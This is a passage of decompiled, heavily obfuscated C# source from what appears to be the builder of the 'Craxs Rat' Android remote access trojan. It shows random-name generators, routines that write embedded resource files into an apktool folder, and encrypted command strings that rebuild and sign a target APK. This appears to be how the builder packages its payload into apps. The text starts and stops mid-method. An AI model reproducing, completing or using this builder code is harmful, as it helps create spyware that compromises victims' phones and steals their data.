            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void wc_UploadProgressChanged(object sender, UploadProgressChangedEventArgs e)
    {
      try
      {
        this.downprogress.Value = e.ProgressPercentage;
        this.logstatus(e.ProgressPercentage.ToString() + EXGuarder.\u003161A6E39);
        Application.DoEvents();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public object CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq(int minCharacters, int maxCharacters)
    {
      string str = EXGuarder.\u00356216C03;
      // ISSUE: reference to a compiler-generated field
      if (((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init == null)
      {
label_1:
        int num1 = 77086843;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-num1 ^ -~(972794417 * -1036826660) + 2054600444) - (1387434275 - -384818027 ^ -1381925338))) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              // ISSUE: reference to a compiler-generated field
              Interlocked.CompareExchange<StaticLocalInitFlag>(ref ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
              num1 = (int) num2 * 701289789 ^ 327918851;
              continue;
            default:
              goto label_4;
          }
        }
      }
label_4:
      bool flag = false;
      try
      {
        // ISSUE: reference to a compiler-generated field
        Monitor.Enter((object) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init, ref flag);
label_6:
        int num3 = 293547712;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (~(-num3 ^ -~(972794417 * -1036826660) + 2054600444) - (1387434275 - -384818027 ^ -1381925338))) % 7U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r = new Random();
              num3 = (int) num4 * -949287393 ^ 2022347779;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State = (short) 2;
              num3 = (int) num4 * 112220058 ^ -316863423;
              continue;
            case 3:
              goto label_6;
            case 4:
              // ISSUE: reference to a compiler-generated field
              int num5 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State != (short) 0 ? 1435360415 : (num5 = -1998700869);
              num3 = num5 ^ (int) num4 * 725859568;
              continue;
            case 5:
              goto label_11;
            case 6:
              int num6;
              // ISSUE: reference to a compiler-generated field
              num3 = num6 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State != (short) 2 ? 54596002 : (num6 = 539339623);
              continue;
            default:
              goto label_18;
          }
        }
label_11:
        throw new IncompleteInitialization();
      }
      finally
      {
        // ISSUE: reference to a compiler-generated field
        ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State = (short) 1;
        if (flag)
        {
label_14:
          int num7 = -622989788;
          while (true)
          {
            uint num8;
            switch ((num8 = (uint) (~(-num7 ^ -~(972794417 * -1036826660) + 2054600444) - (1387434275 - -384818027 ^ -1381925338))) % 3U)
            {
              case 0:
                goto label_14;
              case 1:
                // ISSUE: reference to a compiler-generated field
                Monitor.Exit((object) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init);
                num7 = (int) num8 * 1451346875 ^ -727714860;
                continue;
              default:
                goto label_17;
            }
          }
        }
label_17:;
      }
label_18:
      // ISSUE: reference to a compiler-generated field
      int num9 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r.Next(minCharacters, maxCharacters);
label_19:
      int num10 = 775067269;
      int num11;
      int num12;
      int startIndex;
      StringBuilder stringBuilder;
      while (true)
      {
        uint num13;
        switch ((num13 = (uint) (~(-num10 ^ -~(972794417 * -1036826660) + 2054600444) - (1387434275 - -384818027 ^ -1381925338))) % 9U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            startIndex = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r.Next(0, str.Length);
            num10 = 127708149;
            continue;
          case 1:
            int num14;
            num10 = num14 = num11 <= num12 ? 1699599969 : (num14 = 368062610);
            continue;
          case 2:
            stringBuilder = new StringBuilder();
            num10 = (int) num13 * 447715510 ^ -1979009711;
            continue;
          case 3:
            num12 = num9;
            num11 = 1;
            num10 = (int) num13 * -1437629109 ^ -343730899;
            continue;
          case 5:
            goto label_19;
          case 6:
            stringBuilder.Append(str.Substring(startIndex, 1));
            num10 = (int) num13 * -550016036 ^ -738001966;
            continue;
          case 7:
            num10 = (int) num13 * 327372236 ^ 1828043394;
            continue;
          case 8:
            checked { ++num11; }
            num10 = (int) num13 * 510969154 ^ -551624078;
            continue;
          default:
            goto label_28;
        }
      }
label_28:
      return (object) stringBuilder.ToString();
    }

    public object RandomShit(int minCharacters, int maxCharacters)
    {
      string str = EXGuarder.\u00338430629;
label_1:
      int num1 = 162304874;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((~908724852 - ~-(num2 * 756003817 + --395842928 * -1174806211)) * -298747297)) % 4U)
        {
          case 1:
            // ISSUE: reference to a compiler-generated field
            Interlocked.CompareExchange<StaticLocalInitFlag>(ref ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
            num1 = (int) num3 * -129767424 ^ 997371520;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            int num4 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init != null ? 1080592196 : (num4 = 793044045);
            num1 = num4 ^ (int) num3 * 1670757054;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      bool flag = false;
      try
      {
        // ISSUE: reference to a compiler-generated field
        Monitor.Enter((object) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init, ref flag);
label_7:
        int num5 = -1219864011;
        while (true)
        {
          int num6 = num5;
          uint num7;
          switch ((num7 = (uint) ((~908724852 - ~-(num6 * 756003817 + --395842928 * -1174806211)) * -298747297)) % 7U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r = new Random();
              num5 = (int) num7 * -1893739297 ^ 1185347866;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State = (short) 2;
              num5 = (int) num7 * 950793810 ^ -176707902;
              continue;
            case 2:
              goto label_10;
            case 3:
              int num8;
              // ISSUE: reference to a compiler-generated field
              num5 = num8 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State != (short) 2 ? 139927942 : (num8 = -54381593);
              continue;
            case 5:
              // ISSUE: reference to a compiler-generated field
              int num9 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State != (short) 0 ? -255180419 : (num9 = 1750848176);
              num5 = num9 ^ (int) num7 * 337742205;
              continue;
            case 6:
              goto label_7;
            default:
              goto label_19;
          }
        }
label_10:
        throw new IncompleteInitialization();
      }
      finally
      {
        // ISSUE: reference to a compiler-generated field
        ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init.State = (short) 1;
        if (flag)
        {
label_15:
          int num10 = 1616237136;
          while (true)
          {
            int num11 = num10;
            uint num12;
            switch ((num12 = (uint) ((~908724852 - ~-(num11 * 756003817 + --395842928 * -1174806211)) * -298747297)) % 3U)
            {
              case 0:
                goto label_15;
              case 1:
                // ISSUE: reference to a compiler-generated field
                Monitor.Exit((object) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init);
                num10 = (int) num12 * 2020619327 ^ -1765800130;
                continue;
              default:
                goto label_18;
            }
          }
        }
label_18:;
      }
label_19:
      // ISSUE: reference to a compiler-generated field
      int num13 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r.Next(minCharacters, maxCharacters);
      StringBuilder stringBuilder = new StringBuilder();
      int num14 = num13;
label_20:
      int num15 = -633898641;
      object obj;
      while (true)
      {
        int num16 = num15;
        uint num17;
        int num18;
        switch ((num17 = (uint) ((~908724852 - ~-(num16 * 756003817 + --395842928 * -1174806211)) * -298747297)) % 8U)
        {
          case 0:
            goto label_20;
          case 1:
            num15 = (int) num17 * 32768888 ^ 561790475;
            continue;
          case 3:
            num18 = 1;
            num15 = (int) num17 * -201116161 ^ 1881268632;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            obj = (object) (stringBuilder.ToString() + Conversions.ToString(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).cou));
            num15 = (int) num17 * 470024811 ^ 1499524546;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            int startIndex = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024RandomShit\u00242021C88\u0024r.Next(0, str.Length);
            stringBuilder.Append(str.Substring(startIndex, 1));
            checked { ++num18; }
            num15 = 78117299;
            continue;
          case 6:
            // ISSUE: variable of a reference type
            int& local;
            // ISSUE: reference to a compiler-generated field
            // ISSUE: explicit reference operation
            int num19 = checked (^(local = ref ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).cou) + 1);
            local = num19;
            num15 = (int) num17 * -921324024 ^ -1006937912;
            continue;
          case 7:
            int num20;
            num15 = num20 = num18 <= num14 ? -698738831 : (num20 = 1185903050);
            continue;
          default:
            goto label_28;
        }
      }
label_28:
      return obj;
    }

    private int GenerateRandomNumber(int m0, int m1)
    {
      // ISSUE: reference to a compiler-generated field
      if (((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init == null)
      {
label_1:
        int num1 = 1911528759;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--(~num1 + -(~~-1506516286 - ~(-717982229 - 1396134769))) ^ -1834200733 - -577222620 ^ -1307136389)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              // ISSUE: reference to a compiler-generated field
              Interlocked.CompareExchange<StaticLocalInitFlag>(ref ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
              num1 = (int) num2 * 1288449586 ^ 1419144020;
              continue;
            default:
              goto label_4;
          }
        }
      }
label_4:
      bool flag = false;
      try
      {
        // ISSUE: reference to a compiler-generated field
        Monitor.Enter((object) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init, ref flag);
label_6:
        int num3 = -1236832972;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (--(~num3 + -(~~-1506516286 - ~(-717982229 - 1396134769))) ^ -1834200733 - -577222620 ^ -1307136389)) % 7U)
          {
            case 0:
              goto label_6;
            case 1:
              goto label_10;
            case 2:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number = new Random();
              num3 = (int) num4 * -1789226869 ^ 652501297;
              continue;
            case 3:
              // ISSUE: reference to a compiler-generated field
              int num5 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State != (short) 0 ? 902545139 : (num5 = 384551315);
              num3 = num5 ^ (int) num4 * 704212963;
              continue;
            case 5:
              int num6;
              // ISSUE: reference to a compiler-generated field
              num3 = num6 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State != (short) 2 ? -1998649657 : (num6 = -1966169040);
              continue;
            case 6:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State = (short) 2;
              num3 = (int) num4 * 676950451 ^ -1409227809;
              continue;
            default:
              goto label_19;
          }
        }
label_10:
        throw new IncompleteInitialization();
      }
      finally
      {
        // ISSUE: reference to a compiler-generated field
        ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init.State = (short) 1;
label_14:
        int num7 = -880885632;
        while (true)
        {
          uint num8;
          switch ((num8 = (uint) (--(~num7 + -(~~-1506516286 - ~(-717982229 - 1396134769))) ^ -1834200733 - -577222620 ^ -1307136389)) % 4U)
          {
            case 0:
              goto label_14;
            case 2:
              int num9 = !flag ? 2103814899 : (num9 = -1715390451);
              num7 = num9 ^ (int) num8 * -197388415;
              continue;
            case 3:
              // ISSUE: reference to a compiler-generated field
              Monitor.Exit((object) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init);
              num7 = (int) num8 * -106297035 ^ -1207428934;
              continue;
            default:
              goto label_18;
          }
        }
label_18:;
      }
label_19:
      // ISSUE: reference to a compiler-generated field
      return ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).\u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number.Next(m0, m1);
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj(object sender, DoWorkEventArgs e)
    {
      // ISSUE: variable of a compiler-generated type
      CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj craxsRatssdfwsbyj = (CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) new CraxsStore.Delegate0();
label_1:
      int num1 = -155638353;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(-(num1 * -803265867) * -493949625)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            // ISSUE: reference to a compiler-generated field
            craxsRatssdfwsbyj.\u0024VB\u0024Local_e = e;
            // ISSUE: reference to a compiler-generated field
            craxsRatssdfwsbyj.\u0024State = -1;
            num1 = (int) num2 * -662826065 ^ -1179325877;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            craxsRatssdfwsbyj.\u0024VB\u0024Me = this;
            // ISSUE: reference to a compiler-generated field
            craxsRatssdfwsbyj.\u0024VB\u0024Local_sender = sender;
            num1 = (int) num2 * -1239854374 ^ 1679087677;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            craxsRatssdfwsbyj.\u0024Builder = AsyncVoidMethodBuilder.Create();
            // ISSUE: reference to a compiler-generated field
            craxsRatssdfwsbyj.\u0024Builder.Start<CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj>(ref craxsRatssdfwsbyj);
            num1 = (int) num2 * -1501739747 ^ 1271304952;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public void Sync_Output(object d01, object b01)
    {
      try
      {
        if (!this.InvokeRequired)
          goto label_31;
label_1:
        int num1 = -1062089527;
label_2:
        string str1;
        CraxsStore.Delegate0 method;
        string str2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~--num1 + -(-1834366026 ^ -634747480))) % 30U)
          {
            case 0:
              this.logwork(str2.Replace(EXGuarder.\u00346586D57, EXGuarder.\u00310167179));
              num1 = (int) num2 * 2014745520 ^ 85749957;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated field
              int num3 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).FolderApk ? -817817185 : (num3 = 12586387);
              num1 = num3 ^ (int) num2 * -1315290358;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u0036132033B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u003386D3A26, new object[1]
              {
                (object) (EXGuarder.\u0033B1E5152 + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0033B2E1037 + str1 + EXGuarder.\u0032D100B6F + str1 + EXGuarder.\u0032575210E + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0033B2E1037 + str1 + EXGuarder.\u0032D100B6F + str1 + EXGuarder.\u00336430852)
              }, (string[]) null, (Type[]) null, (bool[]) null, true);
              num1 = (int) num2 * -1613090473 ^ -1314088000;
              continue;
            case 3:
              this.logwork(EXGuarder.\u0032C713876);
              // ISSUE: reference to a compiler-generated field
              System.IO.File.Delete(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0035E732A3C);
              // ISSUE: reference to a compiler-generated field
              System.IO.File.Delete(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0036F226C6A);
              num1 = -942790858;
              continue;
            case 4:
              if (NewLateBinding.LateGet(b01, (Type) null, EXGuarder.\u003096F4D75, new object[0], (string[]) null, (Type[]) null, (bool[]) null).ToString().Contains(EXGuarder.\u00370462625))
              {
                num1 = 407397887;
                continue;
              }
              goto label_38;
            case 5:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).StartedZip = true;
              num1 = (int) num2 * -665700014 ^ -1361251578;
              continue;
            case 6:
              int num4 = !NewLateBinding.LateGet(b01, (Type) null, EXGuarder.\u003096F4D75, new object[0], (string[]) null, (Type[]) null, (bool[]) null).ToString().StartsWith(EXGuarder.\u00346586D57) ? 575130157 : (num4 = 149053406);
              num1 = num4 ^ (int) num2 * 1000803329;
              continue;
            case 7:
              goto label_1;
            case 8:
              Thread.Sleep(1);
              str1 = EXGuarder.\u00313644E06;
              int num5;
              // ISSUE: reference to a compiler-generated field
              num1 = num5 = !(NewLateBinding.LateGet(b01, (Type) null, EXGuarder.\u003096F4D75, new object[0], (string[]) null, (Type[]) null, (bool[]) null).ToString().Contains(EXGuarder.\u00352204B5E) | NewLateBinding.LateGet(b01, (Type) null, EXGuarder.\u003096F4D75, new object[0], (string[]) null, (Type[]) null, (bool[]) null).ToString().Contains(EXGuarder.\u0030B43701C + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u003220E695B)) ? 838756854 : (num5 = 611562584);
              continue;
            case 9:
              str2 = NewLateBinding.LateGet(b01, (Type) null, EXGuarder.\u003096F4D75, new object[0], (string[]) null, (Type[]) null, (bool[]) null).ToString();
              num1 = (int) num2 * -1233155059 ^ 1439759872;
              continue;
            case 10:
              goto label_31;
            case 11:
              Codes.MyMsgBox(EXGuarder.\u0036E171A78, EXGuarder.\u003475F5F77, false, Craxs_Rat.My.Resources.Resources.sucess48px);
              num1 = (int) num2 * -954270479 ^ -1249936732;
              continue;
            case 12:
              int num6;
              // ISSUE: reference to a compiler-generated field
              num1 = num6 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).StartedZip ? -551733864 : (num6 = 882892945);
              continue;
            case 13:
              Thread.Sleep(5000);
              num1 = -205819751;
              continue;
            case 14:
              num1 = (int) num2 * -29424781 ^ -315427437;
              continue;
            case 15:
              this.logwork(EXGuarder.\u00363770E38);
              num1 = (int) num2 * -1967709567 ^ 361571875;
              continue;
            case 16:
              num1 = (int) num2 * -465203422 ^ 1329900185;
              continue;
            case 17:
              Thread.Sleep(5000);
              num1 = 456308457;
              continue;
            case 18:
              goto label_44;
            case 19:
              this.Invoke((Delegate) method, d01, b01);
              num1 = (int) num2 * -2060971893 ^ -1035380720;
              continue;
            case 20:
              method = (CraxsStore.Delegate0) new CraxsStore.delestatustext(this.Sync_Output);
              num1 = (int) num2 * -1836411277 ^ 11394378;
              continue;
            case 21:
              int num7;
              num1 = num7 = !NewLateBinding.LateGet(b01, (Type) null, EXGuarder.\u003096F4D75, new object[0], (string[]) null, (Type[]) null, (bool[]) null).ToString().Contains(EXGuarder.\u003706C601F) ? 240344527 : (num7 = -725469539);
              continue;
            case 22:
              // ISSUE: reference to a compiler-generated field
              int num8 = ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).StartedZip ? 230228404 : (num8 = 103086943);
              num1 = num8 ^ (int) num2 * 1934027632;
              continue;
            case 23:
              goto label_3;
            case 24:
              // ISSUE: reference to a compiler-generated field
              string[] strArray = new string[6]
              {
                ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool,
                EXGuarder.\u0033B2E1037,
                str1,
                EXGuarder.\u0032D100B6F,
                str1,
                EXGuarder.\u0037565243B
              };
              int num9;
              num1 = num9 = System.IO.File.Exists(string.Concat(strArray)) ? 513187935 : (num9 = -213377040);
              continue;
            case 26:
              goto label_11;
            case 27:
              num1 = (int) num2 * 1073940520 ^ 1955069750;
              continue;
            case 28:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u0036132033B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u003386D3A26, new object[1]
              {
                (object) (EXGuarder.\u003633A4F11 + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0033B2E1037 + str1 + EXGuarder.\u0032D100B6F + str1 + EXGuarder.\u00355274B36 + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).TheApkPath + EXGuarder.\u0034C4E2A37)
              }, (string[]) null, (Type[]) null, (bool[]) null, true);
              num1 = (int) num2 * -1062655887 ^ -2000981772;
              continue;
            case 29:
              // ISSUE: reference to a compiler-generated field
              System.IO.File.WriteAllBytes(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0035E732A3C, Craxs_Rat.My.Resources.Resources.c);
              num1 = (int) num2 * -1241215865 ^ 1711097643;
              continue;
            default:
              goto label_34;
          }
        }
label_44:
        return;
label_3:
        return;
label_11:
        this.logwork(EXGuarder.\u003690D483E);
        Process.Start(Settings.Storepath + EXGuarder.\u0030F5A5C0A);
        this.Close();
        return;
label_38:
        return;
label_34:
        // ISSUE: reference to a compiler-generated field
        System.IO.File.WriteAllBytes(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0036F226C6A, Craxs_Rat.My.Resources.Resources.k);
        try
        {
          if (!Directory.Exists(Settings.Storepath + EXGuarder.\u0030F5A5C0A))
          {
label_36:
            int num10 = -969422236;
            while (true)
            {
              uint num11;
              switch ((num11 = (uint) -(~--num10 + -(-1834366026 ^ -634747480))) % 3U)
              {
                case 0:
                  goto label_36;
                case 2:
                  Directory.CreateDirectory(Settings.Storepath + EXGuarder.\u0030F5A5C0A);
                  num10 = (int) num11 * 1737632339 ^ -518880129;
                  continue;
                default:
                  goto label_41;
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_41:
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        NewLateBinding.LateCall(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u0036132033B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u003386D3A26, new object[1]
        {
